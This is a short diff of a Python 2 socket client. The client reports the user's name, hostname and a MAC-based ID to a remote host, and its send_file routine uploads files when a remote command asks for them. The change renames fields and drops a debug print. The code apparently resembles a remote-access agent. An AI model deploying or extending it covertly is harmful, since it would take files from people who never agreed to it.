@@ -14,7 +14,8 @@ sock.connect((host, port))
 # Send computer name
 username = getpass.getuser()
 sock.send(json.dumps({
-	"name":username + "@" + socket.gethostname(),
+	"username":username,
+	"hostname":socket.gethostname(),
 	"uid": str(get_mac())
 }))
 
@@ -87,7 +88,6 @@ def send_file(cmd_data):
 			sock.send(json.dumps({"status":1,"size":len(data)}))
 			sock.send(cmd_data['term'])
 			term = sock.recv(10)
-			print "sending data"
 			sock.send(data)
 			sock.send(term)
 			return
